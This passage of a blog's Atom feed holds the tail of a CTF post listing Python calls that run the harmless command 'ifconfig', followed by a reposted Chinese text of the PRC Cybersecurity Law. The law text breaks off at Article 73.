class=&quot;line&quot;&gt;commands.getoutput(&lt;span class=&quot;string&quot;&gt;&#39;ifconfig&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;commands.getstatusoutput(&lt;span class=&quot;string&quot;&gt;&#39;ifconfig&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;subprocess.call([&lt;span class=&quot;string&quot;&gt;&#39;ifconfig&#39;&lt;/span&gt;],shell=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>【转】[中华人民共和国网络安全法]</title>
    <link href="https://zo1ro.github.io/2018/08/27/legal/"/>
    <id>https://zo1ro.github.io/2018/08/27/legal/</id>
    <published>2018-08-27T14:05:39.000Z</published>
    <updated>2018-10-21T14:12:53.601Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>发布时间：2016-11-08 来源：政策法规司</p></blockquote><p>中华人民共和国主席令</p><p>第五十三号</p><p>《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。</p><a id="more"></a><p> 中华人民共和国主席 习近平</p><p> 2016年11月7日</p><p>中华人民共和国网络安全法</p><p>目 录</p><p> 第一章 总则</p><p> 第二章 网络安全支持与促进</p><p> 第三章 网络运行安全</p><p> 第一节 一般规定</p><p> 第二节 关键信息基础设施的运行安全</p><p> 第四章 网络信息安全</p><p> 第五章 监测预警与应急处置</p><p> 第六章 法律责任</p><p> 第七章 附则</p><h1 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章 总则"></a>第一章 总则</h1><h2 id="第一条"><a href="#第一条" class="headerlink" title="第一条"></a><strong>第一条</strong></h2><p>为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><h2 id="第二条"><a href="#第二条" class="headerlink" title="第二条"></a><strong>第二条</strong></h2><p>在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><h2 id="第三条"><a href="#第三条" class="headerlink" title="第三条"></a><strong>第三条</strong></h2><p>国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><h2 id="第四条"><a href="#第四条" class="headerlink" title="第四条"></a><strong>第四条</strong></h2><p>国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><h2 id="第五条"><a href="#第五条" class="headerlink" title="第五条"></a><strong>第五条</strong></h2><p>国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><h2 id="第六条"><a href="#第六条" class="headerlink" title="第六条"></a><strong>第六条</strong></h2><p>国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><h2 id="第七条"><a href="#第七条" class="headerlink" title="第七条"></a><strong>第七条</strong></h2><p>国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><h2 id="第八条"><a href="#第八条" class="headerlink" title="第八条"></a><strong>第八条</strong></h2><p>国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><h2 id="第九条"><a href="#第九条" class="headerlink" title="第九条"></a><strong>第九条</strong></h2><p>网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><h2 id="第十条"><a href="#第十条" class="headerlink" title="第十条"></a><strong>第十条</strong></h2><p>建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><h2 id="第十一条"><a href="#第十一条" class="headerlink" title="第十一条"></a><strong>第十一条</strong></h2><p>网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><h2 id="第十二条"><a href="#第十二条" class="headerlink" title="第十二条"></a><strong>第十二条</strong></h2><p>国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><h2 id="第十三条"><a href="#第十三条" class="headerlink" title="第十三条"></a><strong>第十三条</strong></h2><p>国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><h2 id="第十四条"><a href="#第十四条" class="headerlink" title="第十四条"></a><strong>第十四条</strong></h2><p>任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><h1 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h1><h2 id="第十五条"><a href="#第十五条" class="headerlink" title="第十五条"></a><strong>第十五条</strong></h2><p>国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><h2 id="第十六条"><a href="#第十六条" class="headerlink" title="第十六条"></a><strong>第十六条</strong></h2><p>国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><h2 id="第十七条"><a href="#第十七条" class="headerlink" title="第十七条"></a><strong>第十七条</strong></h2><p>国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><h2 id="第十八条"><a href="#第十八条" class="headerlink" title="第十八条"></a><strong>第十八条</strong></h2><p>国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><h2 id="第十九条"><a href="#第十九条" class="headerlink" title="第十九条"></a><strong>第十九条</strong></h2><p>各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><h2 id="第二十条"><a href="#第二十条" class="headerlink" title="第二十条"></a><strong>第二十条</strong></h2><p>国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><h1 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h1><h2 id="第一节-一般规定"><a href="#第一节-一般规定" class="headerlink" title="第一节 一般规定"></a>第一节 一般规定</h2><h3 id="第二十一条"><a href="#第二十一条" class="headerlink" title="第二十一条"></a><strong>第二十一条</strong></h3><p>国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>（四）采取数据分类、重要数据备份和加密等措施；</p><p>（五）法律、行政法规规定的其他义务。</p><h3 id="第二十二条"><a href="#第二十二条" class="headerlink" title="第二十二条"></a><strong>第二十二条</strong></h3><p>网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><h3 id="第二十三条"><a href="#第二十三条" class="headerlink" title="第二十三条"></a><strong>第二十三条</strong></h3><p>网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><h3 id="第二十四条"><a href="#第二十四条" class="headerlink" title="第二十四条"></a><strong>第二十四条</strong></h3><p>网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><h3 id="第二十五条"><a href="#第二十五条" class="headerlink" title="第二十五条"></a><strong>第二十五条</strong></h3><p>网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><h3 id="第二十六条"><a href="#第二十六条" class="headerlink" title="第二十六条"></a><strong>第二十六条</strong></h3><p>开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><h3 id="第二十七条"><a href="#第二十七条" class="headerlink" title="第二十七条"></a><strong>第二十七条</strong></h3><p>任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><h3 id="第二十八条"><a href="#第二十八条" class="headerlink" title="第二十八条"></a><strong>第二十八条</strong></h3><p>网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><h3 id="第二十九条"><a href="#第二十九条" class="headerlink" title="第二十九条"></a><strong>第二十九条</strong></h3><p>国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><h3 id="第三十条"><a href="#第三十条" class="headerlink" title="第三十条"></a><strong>第三十条</strong></h3><p>网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><h2 id="第二节-关键信息基础设施的运行安全"><a href="#第二节-关键信息基础设施的运行安全" class="headerlink" title="第二节 关键信息基础设施的运行安全"></a>第二节 关键信息基础设施的运行安全</h2><h3 id="第三十一条"><a href="#第三十一条" class="headerlink" title="第三十一条"></a><strong>第三十一条</strong></h3><p>国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><h3 id="第三十二条"><a href="#第三十二条" class="headerlink" title="第三十二条"></a><strong>第三十二条</strong></h3><p>按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><h3 id="第三十三条"><a href="#第三十三条" class="headerlink" title="第三十三条"></a><strong>第三十三条</strong></h3><p>建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><h3 id="第三十四条"><a href="#第三十四条" class="headerlink" title="第三十四条"></a><strong>第三十四条</strong></h3><p>除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>（三）对重要系统和数据库进行容灾备份；</p><p>（四）制定网络安全事件应急预案，并定期进行演练；</p><p>（五）法律、行政法规规定的其他义务。</p><h3 id="第三十五条"><a href="#第三十五条" class="headerlink" title="第三十五条"></a><strong>第三十五条</strong></h3><p>关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><h3 id="第三十六条"><a href="#第三十六条" class="headerlink" title="第三十六条"></a><strong>第三十六条</strong></h3><p>关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><h3 id="第三十七条"><a href="#第三十七条" class="headerlink" title="第三十七条"></a><strong>第三十七条</strong></h3><p>关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><h3 id="第三十八条"><a href="#第三十八条" class="headerlink" title="第三十八条"></a><strong>第三十八条</strong></h3><p>关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><h3 id="第三十九条"><a href="#第三十九条" class="headerlink" title="第三十九条"></a><strong>第三十九条</strong></h3><p>国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><h1 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a><strong>第四章 网络信息安全</strong></h1><h2 id="第四十条"><a href="#第四十条" class="headerlink" title="第四十条"></a><strong>第四十条</strong></h2><p>网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><h2 id="第四十一条"><a href="#第四十一条" class="headerlink" title="第四十一条"></a><strong>第四十一条</strong></h2><p>网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><h2 id="第四十二条"><a href="#第四十二条" class="headerlink" title="第四十二条"></a><strong>第四十二条</strong></h2><p>网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><h2 id="第四十三条"><a href="#第四十三条" class="headerlink" title="第四十三条"></a><strong>第四十三条</strong></h2><p>个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><h2 id="第四十四条"><a href="#第四十四条" class="headerlink" title="第四十四条"></a><strong>第四十四条</strong></h2><p>任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><h2 id="第四十五条"><a href="#第四十五条" class="headerlink" title="第四十五条"></a><strong>第四十五条</strong></h2><p>依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><h2 id="第四十六条"><a href="#第四十六条" class="headerlink" title="第四十六条"></a><strong>第四十六条</strong></h2><p>任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><h2 id="第四十七条"><a href="#第四十七条" class="headerlink" title="第四十七条"></a><strong>第四十七条</strong></h2><p>网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><h2 id="第四十八条"><a href="#第四十八条" class="headerlink" title="第四十八条"></a><strong>第四十八条</strong></h2><p>任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><h2 id="第四十九条"><a href="#第四十九条" class="headerlink" title="第四十九条"></a><strong>第四十九条</strong></h2><p>网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><h2 id="第五十条"><a href="#第五十条" class="headerlink" title="第五十条"></a><strong>第五十条</strong></h2><p>国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><h1 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a><strong>第五章 监测预警与应急处置</strong></h1><h2 id="第五十一条"><a href="#第五十一条" class="headerlink" title="第五十一条"></a><strong>第五十一条</strong></h2><p>国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><h2 id="第五十二条"><a href="#第五十二条" class="headerlink" title="第五十二条"></a><strong>第五十二条</strong></h2><p>负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><h2 id="第五十三条"><a href="#第五十三条" class="headerlink" title="第五十三条"></a><strong>第五十三条</strong></h2><p>国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><h2 id="第五十四条"><a href="#第五十四条" class="headerlink" title="第五十四条"></a><strong>第五十四条</strong></h2><p>网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><h2 id="第五十五条"><a href="#第五十五条" class="headerlink" title="第五十五条"></a><strong>第五十五条</strong></h2><p>发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><h2 id="第五十六条"><a href="#第五十六条" class="headerlink" title="第五十六条"></a><strong>第五十六条</strong></h2><p>省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><h2 id="第五十七条"><a href="#第五十七条" class="headerlink" title="第五十七条"></a><strong>第五十七条</strong></h2><p>因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><h2 id="第五十八条"><a href="#第五十八条" class="headerlink" title="第五十八条"></a><strong>第五十八条</strong></h2><p>因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><h1 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h1><h2 id="第五十九条"><a href="#第五十九条" class="headerlink" title="第五十九条"></a><strong>第五十九条</strong></h2><p>网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><h2 id="第六十条"><a href="#第六十条" class="headerlink" title="第六十条"></a><strong>第六十条</strong></h2><p>违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>（一）设置恶意程序的；</p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>（三）擅自终止为其产品、服务提供安全维护的。</p><h2 id="第六十一条"><a href="#第六十一条" class="headerlink" title="第六十一条"></a><strong>第六十一条</strong></h2><p>网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><h2 id="第六十二条"><a href="#第六十二条" class="headerlink" title="第六十二条"></a><strong>第六十二条</strong></h2><p>违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><h2 id="第六十三条"><a href="#第六十三条" class="headerlink" title="第六十三条"></a><strong>第六十三条</strong></h2><p>违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><h2 id="第六十四条"><a href="#第六十四条" class="headerlink" title="第六十四条"></a><strong>第六十四条</strong></h2><p>网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><h2 id="第六十五条"><a href="#第六十五条" class="headerlink" title="第六十五条"></a><strong>第六十五条</strong></h2><p>关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><h2 id="第六十六条"><a href="#第六十六条" class="headerlink" title="第六十六条"></a><strong>第六十六条</strong></h2><p>关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><h2 id="第六十七条"><a href="#第六十七条" class="headerlink" title="第六十七条"></a><strong>第六十七条</strong></h2><p>违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><h2 id="第六十八条"><a href="#第六十八条" class="headerlink" title="第六十八条"></a><strong>第六十八条</strong></h2><p>网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><h2 id="第六十九条"><a href="#第六十九条" class="headerlink" title="第六十九条"></a><strong>第六十九条</strong></h2><p>网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><h2 id="第七十条"><a href="#第七十条" class="headerlink" title="第七十条"></a><strong>第七十条</strong></h2><p>发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><h2 id="第七十一条"><a href="#第七十一条" class="headerlink" title="第七十一条"></a><strong>第七十一条</strong></h2><p>有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><h2 id="第七十二条"><a href="#第七十二条" class="headerlink" title="第七十二条"></a><strong>第七十二条</strong></h2><p>国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><h2 id="第七十三条"><a href="#第七十三条" class="headerlink" 